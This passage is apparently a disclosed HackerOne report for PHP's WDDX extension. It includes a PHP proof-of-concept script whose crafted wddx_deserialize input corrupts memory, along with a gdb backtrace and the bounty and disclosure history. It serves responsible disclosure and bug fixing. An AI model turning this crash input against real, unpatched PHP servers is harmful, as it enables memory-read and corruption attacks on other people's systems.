class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eent2\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"p\"\u003e.....\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eefree\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eent1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"n\"\u003estack\u003c/span\u003e\u003cspan class=\"o\"\u003e-\u0026gt;\u003c/span\u003e\u003cspan class=\"n\"\u003edone\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"p\"\u003e....\u003c/span\u003e\n\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"test-script\"\u003eTest script\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$xml\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sh\"\u003e\u0026lt;\u0026lt;\u0026lt;EOF\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; ?\u0026gt;\n\u0026lt;wddxPacket version=\u0026quot;1.0\u0026quot;\u0026gt;\n\u0026lt;number\u0026gt;2261634.5098039215\u0026lt;/number\u0026gt;\n\u0026lt;binary\u0026gt;\u0026lt;boolean/\u0026gt;\u0026lt;/binary\u0026gt;\n\u0026lt;/wddxPacket\u0026gt;\nEOF;\u003c/span\u003e\n\u003cspan class=\"nv\"\u003e$wddx\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003ewddx_deserialize\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$xml\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nb\"\u003evar_dump\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003e$wddx\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen processing \u003ccode\u003ebinary\u003c/code\u003e tag, a \u003ccode\u003est_entry\u003c/code\u003e which describes \u003ccode\u003ebinary\u003c/code\u003e tag is pushed to stack. \u003ccode\u003e\u0026lt;boolean/\u0026gt;\u003c/code\u003e will lead to \u003ccode\u003est_entry\u003c/code\u003e of \u003ccode\u003ebinary\u003c/code\u003e tag is popped out. When processing \u003ccode\u003e\u0026lt;/binary\u0026gt;\u003c/code\u003e, \u003ccode\u003ephp_wddx_pop_element()\u003c/code\u003e function is called. \u003ccode\u003ephp_wddx_pop_element\u003c/code\u003e will take top of stack and use it as a string object, try to decode it. We can use this issue to read anything at anywhere. If this value is not a valid memory address, it will lead to memory corruption.\u003c/p\u003e\n\n\u003cp\u003eBelow backtrace of gdb will give you details.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[-------------------------------------code-------------------------------------]\n   0x82cf418 \u0026lt;php_wddx_pop_element+440\u0026gt;:        mov    eax,DWORD PTR [ebx]\n=\u0026gt; 0x82cf41a \u0026lt;php_wddx_pop_element+442\u0026gt;:        mov    edx,DWORD PTR [eax+0xc]\n   0x82cf41d \u0026lt;php_wddx_pop_element+445\u0026gt;:        add    eax,0x10\n   0x82cf420 \u0026lt;php_wddx_pop_element+448\u0026gt;:        mov    DWORD PTR [esp],eax\n   0x82cf423 \u0026lt;php_wddx_pop_element+451\u0026gt;:        mov    DWORD PTR [esp+0x4],edx\n   0x82cf427 \u0026lt;php_wddx_pop_element+455\u0026gt;:        call   0x82702f0 \u0026lt;php_base64_decode\u0026gt;\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbce0 --\u0026gt; 0x89b92d4 (\u0026quot;boolean\u0026quot;)\n0004| 0xbfffbce4 --\u0026gt; 0xb7870080 --\u0026gt; 0x0\n0008| 0xbfffbce8 --\u0026gt; 0x89b8568 --\u0026gt; 0x8931938 --\u0026gt; 0x0\n0012| 0xbfffbcec --\u0026gt; 0xb7c66458 (\u0026lt;__GI___libc_malloc+8\u0026gt;:        add    ebx,0x140ba8)\n0016| 0xbfffbcf0 --\u0026gt; 0xb7f1e000 --\u0026gt; 0x15adac\n0020| 0xbfffbcf4 --\u0026gt; 0xb7d371bf (\u0026lt;__memcpy_ssse3_rep+31\u0026gt;:       add    ebx,0x31501)\n0024| 0xbfffbcf8 --\u0026gt; 0xb7f1e000 --\u0026gt; 0x15adac\n0028| 0xbfffbcfc --\u0026gt; 0xb7e6409b (\u0026lt;xmlStrndup__internal_alias+75\u0026gt;:       mov    eax,edi)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\nphp_wddx_pop_element (user_data=0xbfffbf6c, name=\u0026lt;optimized out\u0026gt;) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n905                             zend_string *new_str = php_base64_decode(\ngdb-peda$ bt\n#0  php_wddx_pop_element (user_data=0xbfffbf6c, name=\u0026lt;optimized out\u0026gt;) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:905\n#1  0x082d602b in _end_element_handler (user=0xb7870080, name=0x89b92cd \u0026quot;binary\u0026quot;) at /root/fuzzer/PHP-7.1/ext/xml/compat.c:219\n#2  0xb7df9302 in xmlParseEndTag1 (ctxt=ctxt@entry=0x89b8568, line=line@entry=0x0) at parser.c:8796\n#3  0xb7e01c89 in xmlParseTryOrFinish (ctxt=ctxt@entry=0x89b8568, terminate=terminate@entry=0x1) at parser.c:11743\n#4  0xb7e02da3 in xmlParseChunk__internal_alias (ctxt=0x89b8568,\n    chunk=chunk@entry=0xb78661f0 \u0026quot;\u0026lt;?xml version=\\\u0026quot;1.0\\\u0026quot; ?\u0026gt;\\r\\n\u0026lt;wddxPacket version=\\\u0026quot;1.0\\\u0026quot;\u0026gt;\\r\\n\u0026lt;number\u0026gt;2261634.5098039215\u0026lt;/number\u0026gt;\\r\\n\u0026lt;binary\u0026gt;\u0026lt;boolean/\u0026gt;\u0026lt;/binary\u0026gt;\\r\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;, size=size@entry=0x83,\n    terminate=terminate@entry=0x1) at parser.c:12446\n#5  0x082d6336 in php_XML_Parse (parser=parser@entry=0xb7870080,\n    data=data@entry=0xb78661f0 \u0026quot;\u0026lt;?xml version=\\\u0026quot;1.0\\\u0026quot; ?\u0026gt;\\r\\n\u0026lt;wddxPacket version=\\\u0026quot;1.0\\\u0026quot;\u0026gt;\\r\\n\u0026lt;number\u0026gt;2261634.5098039215\u0026lt;/number\u0026gt;\\r\\n\u0026lt;binary\u0026gt;\u0026lt;boolean/\u0026gt;\u0026lt;/binary\u0026gt;\\r\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;, data_len=data_len@entry=0x83,\n    is_final=is_final@entry=0x1) at /root/fuzzer/PHP-7.1/ext/xml/compat.c:600\n#6  0x082d1904 in php_wddx_deserialize_ex (\n    value=value@entry=0xb78661f0 \u0026quot;\u0026lt;?xml version=\\\u0026quot;1.0\\\u0026quot; ?\u0026gt;\\r\\n\u0026lt;wddxPacket version=\\\u0026quot;1.0\\\u0026quot;\u0026gt;\\r\\n\u0026lt;number\u0026gt;2261634.5098039215\u0026lt;/number\u0026gt;\\r\\n\u0026lt;binary\u0026gt;\u0026lt;boolean/\u0026gt;\u0026lt;/binary\u0026gt;\\r\\n\u0026lt;/wddxPacket\u0026gt;\u0026quot;, vallen=0x83,\n    return_value=return_value@entry=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1095\n#7  0x082d1ba7 in zif_wddx_deserialize (execute_data=0xb78140b0, return_value=0xb7814080) at /root/fuzzer/PHP-7.1/ext/wddx/wddx.c:1313\n#8  0x0838b6c6 in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:675\n#9  0x0837c322 in execute_ex (ex=0xb7814020) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:429\n#10 0x083cb3bb in zend_execute (op_array=op_array@entry=0xb7865180, return_value=return_value@entry=0x0) at /root/fuzzer/PHP-7.1/Zend/zend_vm_execute.h:474\n#11 0x0833bb40 in zend_execute_scripts (type=type@entry=0x8, retval=retval@entry=0x0, file_count=file_count@entry=0x3) at /root/fuzzer/PHP-7.1/Zend/zend.c:1474\n#12 0x082dd0cb in php_execute_script (primary_file=primary_file@entry=0xbfffe2b8) at /root/fuzzer/PHP-7.1/main/main.c:2533\n#13 0x083cd70a in do_cli (argc=argc@entry=0x3, argv=argv@entry=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:990\n#14 0x0806d544 in main (argc=0x3, argv=0x88eca80) at /root/fuzzer/PHP-7.1/sapi/cli/php_cli.c:1378\n#15 0xb7c07943 in __libc_start_main (main=0x806d070 \u0026lt;main\u0026gt;, argc=0x3, ubp_av=0xbffff564, init=0x83d5260 \u0026lt;__libc_csu_init\u0026gt;, fini=0x83d52d0 \u0026lt;__libc_csu_fini\u0026gt;, rtld_fini=0xb7fee700 \u0026lt;_dl_fini\u0026gt;,\n    stack_end=0xbffff55c) at libc-start.c:274\n#16 0x0806d5d1 in _start ()\ngdb-peda$ i r $eax\neax            0x41414141       0x41414141\ngdb-peda$\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-11-12T09:20:06.389Z","allow_singular_disclosure_after":-35666905.2077929,"singular_disclosure_allowed":true,"vote_count":1,"voters":["spetr0x"],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1343683,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Project owner has confirmed: https://bugs.php.net/bug.php?id=73631","markdown_message":"\u003cp\u003eProject owner has confirmed: \u003ca title=\"https://bugs.php.net/bug.php?id=73631\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D73631\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=73631\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2016-12-06T09:03:21.313Z","updated_at":"2016-12-06T09:03:21.313Z","actor":{"username":"fosec","cleared":false,"url":"/fosec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467807,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:32:20.165Z","updated_at":"2017-02-07T07:32:20.165Z","additional_data":{"old_severity":null,"new_severity":"Medium","old_severity_id":null,"new_severity_id":24020},"actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467808,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:32:27.326Z","updated_at":"2017-02-07T07:32:27.326Z","actor":{"username":"arice","cleared":false,"url":"/arice","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/020/83152cb2d070f3f6a63c1b61bae47257722b5ad2_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"reporter":{"username":"fosec","url":"/fosec"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1467809,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-07T07:32:31.971Z","updated_at":"2017-02-07T07:32:31.971Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"fosec","url":"/fosec"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1512884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello arice, I submitted this before the IBB PHP program updated the policy. With medium impact security bugs, I think it would be fair to reward $1000 bounty. Thanks!\n","markdown_message":"\u003cp\u003eHello arice, I submitted this before the IBB PHP program updated the policy. With medium impact security bugs, I think it would be fair to reward $1000 bounty. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-01T08:16:19.725Z","updated_at":"2017-03-01T08:16:19.725Z","actor":{"username":"fosec","cleared":false,"url":"/fosec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6025867,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-13T09:20:06.290Z","updated_at":"2019-10-13T09:20:06.290Z","first_to_agree":true,"actor":{"username":"reed","cleared":false,"url":"/reed","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/132/66d7eadcea16b878bb67bfd697b9542250a801a7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6285679,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-12T09:20:07.882Z","updated_at":"2019-11-12T09:20:07.882Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}